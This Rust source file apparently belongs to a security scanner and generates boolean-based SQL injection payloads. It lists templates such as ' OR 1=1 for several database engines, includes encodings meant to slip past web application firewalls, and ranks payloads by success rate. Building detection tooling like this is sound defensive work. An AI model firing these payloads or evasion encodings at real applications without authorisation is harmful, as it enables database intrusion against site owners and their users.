//! Boolean-Based SQL Injection Payloads
//! Generate parameterized boolean payloads with encoding and comment obfuscation.

use crate::checks::sqli::boolean_based::BinaryResponse;
use std::collections::HashMap;

/// Maximum cached payloads per category
const MAX_CACHED_PAYLOADS: usize = 100;

/// Encoding type for WAF evasion
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum EncodingType {
    None,
    UrlEncode,
    DoubleUrlEncode,
    HexEncode,
    UnicodeEncode,
    Base64,
    HtmlEntity,
}

/// Comment style for SQL termination
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CommentStyle {
    DoubleDash,      // --
    Hash,            // # (MySQL)
    SlashStar,       // /* */
    OracleRem,       // REM
    MSSQLDoubleDash, // --+
    NoComment,       // Rely on query structure
}

impl CommentStyle {
    pub fn as_str(&self) -> &'static str {
        match self {
            CommentStyle::DoubleDash => "-- ",
            CommentStyle::Hash => "#",
            CommentStyle::SlashStar => "/* */",
            CommentStyle::OracleRem => "REM ",
            CommentStyle::MSSQLDoubleDash => "--+",
            CommentStyle::NoComment => "",
        }
    }
}

/// Boolean payload template
#[derive(Debug, Clone)]
pub struct BooleanPayload {
    pub id: String,
    pub template: String,
    pub expected_response: BinaryResponse,
    pub dbms_targets: Vec<String>,
    pub encoding: EncodingType,
    pub comment_style: CommentStyle,
    pub success_count: u32,
    pub failure_count: u32,
}

impl BooleanPayload {
    /// Calculate success rate
    pub fn success_rate(&self) -> f64 {
        let total = self.success_count + self.failure_count;
        if total == 0 {
            return 0.5;
        }
        self.success_count as f64 / total as f64
    }

    /// Render the payload with a specific parameter value
    pub fn render(&self, param: &str, value: &str) -> String {
        self.template
            .replace("{{PARAM}}", param)
            .replace("{{VALUE}}", value)
            .replace("{{COMMENT}}", self.comment_style.as_str())
    }
}

/// Boolean payload generator
pub struct BooleanPayloadGenerator {
    payloads: HashMap<String, BooleanPayload>,
    encoding_cache: HashMap<String, String>,
    category_index: HashMap<String, Vec<String>>,
}

impl BooleanPayloadGenerator {
    /// Create a new boolean payload generator
    pub fn new() -> Self {
        let mut gen = Self {
            payloads: HashMap::new(),
            encoding_cache: HashMap::new(),
            category_index: HashMap::new(),
        };
        gen.initialize_payloads();
        gen
    }

    /// Initialize with standard boolean SQLi payloads
    fn initialize_payloads(&mut self) {
        // AND-based true conditions
        self.add_payload(BooleanPayload {
            id: "and_true_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND '1'='1{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "mssql".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        self.add_payload(BooleanPayload {
            id: "and_true_2".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND 1=1{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "oracle".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        self.add_payload(BooleanPayload {
            id: "and_true_3".to_string(),
            template: "{{PARAM}}={{VALUE}} AND 1=1{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True,
            dbms_targets: vec!["mysql".into(), "postgresql".into()],
            encoding: EncodingType::None,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        // AND-based false conditions
        self.add_payload(BooleanPayload {
            id: "and_false_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND '1'='2{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::False,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "mssql".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        self.add_payload(BooleanPayload {
            id: "and_false_2".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND 1=2{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::False,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "oracle".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        // OR-based true conditions
        self.add_payload(BooleanPayload {
            id: "or_true_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' OR '1'='1{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "mssql".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        self.add_payload(BooleanPayload {
            id: "or_true_2".to_string(),
            template: "{{PARAM}}={{VALUE}}' OR 1=1{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True,
            dbms_targets: vec!["mysql".into(), "postgresql".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::Hash,
            success_count: 0,
            failure_count: 0,
        });

        // OR-based false conditions (should still return data due to OR)
        self.add_payload(BooleanPayload {
            id: "or_false_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' OR '1'='2{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True, // OR makes it return original
            dbms_targets: vec!["mysql".into(), "postgresql".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        // Comparison-based payloads
        self.add_payload(BooleanPayload {
            id: "cmp_true_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND SUBSTRING('test',1,1)='t'{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "mssql".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        self.add_payload(BooleanPayload {
            id: "cmp_false_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND SUBSTRING('test',1,1)='x'{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::False,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "mssql".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        // NULL comparison payloads
        self.add_payload(BooleanPayload {
            id: "null_true_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND NULL IS NULL{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::True,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "oracle".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        self.add_payload(BooleanPayload {
            id: "null_false_1".to_string(),
            template: "{{PARAM}}={{VALUE}}' AND NULL IS NOT NULL{{COMMENT}}".to_string(),
            expected_response: BinaryResponse::False,
            dbms_targets: vec!["mysql".into(), "postgresql".into(), "oracle".into()],
            encoding: EncodingType::UrlEncode,
            comment_style: CommentStyle::DoubleDash,
            success_count: 0,
            failure_count: 0,
        });

        // Category indexing
        self.category_index.insert(
            "and_true".to_string(),
            vec!["and_true_1".into(), "and_true_2".into(), "and_true_3".into()],
        );
        self.category_index.insert(
            "and_false".to_string(),
            vec!["and_false_1".into(), "and_false_2".into()],
        );
        self.category_index.insert(
            "or_true".to_string(),
            vec!["or_true_1".into(), "or_true_2".into()],
        );
        self.category_index.insert(
            "comparison".to_string(),
            vec!["cmp_true_1".into(), "cmp_false_1".into()],
        );
        self.category_index.insert(
            "null_test".to_string(),
            vec!["null_true_1".into(), "null_false_1".into()],
        );
    }

    /// Add a payload to the collection
    fn add_payload(&mut self, payload: BooleanPayload) {
        if self.payloads.len() < MAX_CACHED_PAYLOADS {
            self.payloads.insert(payload.id.clone(), payload);
        }
    }

    /// Get payloads by category
    pub fn get_by_category(&self, category: &str) -> Vec<&BooleanPayload> {
        self.category_index
            .get(category)
            .map(|ids| ids.iter().filter_map(|id| self.payloads.get(id)).collect())
            .unwrap_or_default()
    }

    /// Get all payloads targeting a specific DBMS
    pub fn get_for_dbms(&self, dbms: &str) -> Vec<&BooleanPayload> {
        self.payloads
            .values()
            .filter(|p| p.dbms_targets.iter().any(|t| t.to_lowercase() == dbms.to_lowercase()))
            .collect()
    }

    /// Get payloads by expected response type
    pub fn get_by_response(&self, response: BinaryResponse) -> Vec<&BooleanPayload> {
        self.payloads
            .values()
            .filter(|p| p.expected_response == response)
            .collect()
    }

    /// Record a successful payload execution
    pub fn record_success(&mut self, payload_id: &str) {
        if let Some(payload) = self.payloads.get_mut(payload_id) {
            payload.success_count += 1;
        }
    }

    /// Record a failed payload execution
    pub fn record_failure(&mut self, payload_id: &str) {
        if let Some(payload) = self.payloads.get_mut(payload_id) {
            payload.failure_count += 1;
        }
    }

    /// Encode a payload string
    pub fn encode(&mut self, input: &str, encoding: EncodingType) -> String {
        let cache_key = format!("{:?}:{}", encoding, input);

        if let Some(cached) = self.encoding_cache.get(&cache_key) {
            return cached.clone();
        }

        let encoded = match encoding {
            EncodingType::None => input.to_string(),
            EncodingType::UrlEncode => urlencoding::encode(input).to_string(),
            EncodingType::DoubleUrlEncode => {
                let once = urlencoding::encode(input);
                urlencoding::encode(&once).to_string()
            }
            EncodingType::HexEncode => input
                .bytes()
                .map(|b| format!("%{:02X}", b))
                .collect(),
            EncodingType::UnicodeEncode => input
                .chars()
                .map(|c| format!("\\u{:04X}", c as u32))
                .collect(),
            EncodingType::Base64 => base64_encode(input.as_bytes()),
            EncodingType::HtmlEntity => html_entity_encode(input),
        };

        // Cache with bounded size
        if self.encoding_cache.len() < MAX_CACHED_PAYLOADS {
            self.encoding_cache.insert(cache_key, encoded.clone());
        }

        encoded
    }

    /// Get top performing payloads sorted by success rate
    pub fn get_top_payloads(&self, limit: usize) -> Vec<&BooleanPayload> {
        let mut payloads: Vec<_> = self.payloads.values().collect();
        payloads.sort_by(|a, b| {
            b.success_rate()
                .partial_cmp(&a.success_rate())
                .unwrap_or(std::cmp::Ordering::Equal)
        });
        payloads.into_iter().take(limit).collect()
    }

    /// Get all available payload IDs
    pub fn get_all_ids(&self) -> Vec<&String> {
        self.payloads.keys().collect()
    }
}

impl Default for BooleanPayloadGenerator {
    fn default() -> Self {
        Self::new()
    }
}

/// Simple base64 encoding (for dependency-free implementation)
fn base64_encode(bytes: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();

    for chunk in bytes.chunks(3) {
        let b0 = chunk[0] as usize;
        let b1 = chunk.get(1).copied().unwrap_or(0) as usize;
        let b2 = chunk.get(2).copied().unwrap_or(0) as usize;

        result.push(ALPHABET[(b0 >> 2)] as char);
        result.push(ALPHABET[((b0 & 0x03) << 4) | (b1 >> 4)] as char);

        if chunk.len() > 1 {
            result.push(ALPHABET[((b1 & 0x0F) << 2) | (b2 >> 6)] as char);
        } else {
            result.push('=');
        }

        if chunk.len() > 2 {
            result.push(ALPHABET[b2 & 0x3F] as char);
        } else {
            result.push('=');
        }
    }

    result
}

/// HTML entity encoding
fn html_entity_encode(input: &str) -> String {
    input
        .chars()
        .flat_map(|c| {
            match c {
                '<' => "&lt;".to_string(),
                '>' => "&gt;".to_string(),
                '&' => "&amp;".to_string(),
                '"' => "&quot;".to_string(),
                '\'' => "&#39;".to_string(),
                _ => c.to_string(),
            }
            .into_bytes()
        })
        .map(|b| b as char)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_rendering() {
        let gen = BooleanPayloadGenerator::new();
        
        if let Some(payload) = gen.payloads.get("and_true_1") {
            let rendered = payload.render("id", "1");
            assert!(rendered.contains("id=1"));
            assert!(rendered.contains("'1'='1"));
        }
    }

    #[test]
    fn test_encoding() {
        let mut gen = BooleanPayloadGenerator::new();
        
        let url_encoded = gen.encode("' OR 1=1--", EncodingType::UrlEncode);
        assert!(url_encoded.contains("%27"));
        
        let hex_encoded = gen.encode("ABC", EncodingType::HexEncode);
        assert_eq!(hex_encoded, "%41%42%43");
    }

    #[test]
    fn test_success_rate() {
        let mut gen = BooleanPayloadGenerator::new();
        
        gen.record_success("and_true_1");
        gen.record_success("and_true_1");
        gen.record_failure("and_true_1");
        
        if let Some(payload) = gen.payloads.get("and_true_1") {
            assert!(payload.success_rate() > 0.6);
        }
    }

    #[test]
    fn test_category_filtering() {
        let gen = BooleanPayloadGenerator::new();
        
        let and_true = gen.get_by_category("and_true");
        assert!(!and_true.is_empty());
        
        let and_false = gen.get_by_category("and_false");
        assert!(!and_false.is_empty());
    }
}
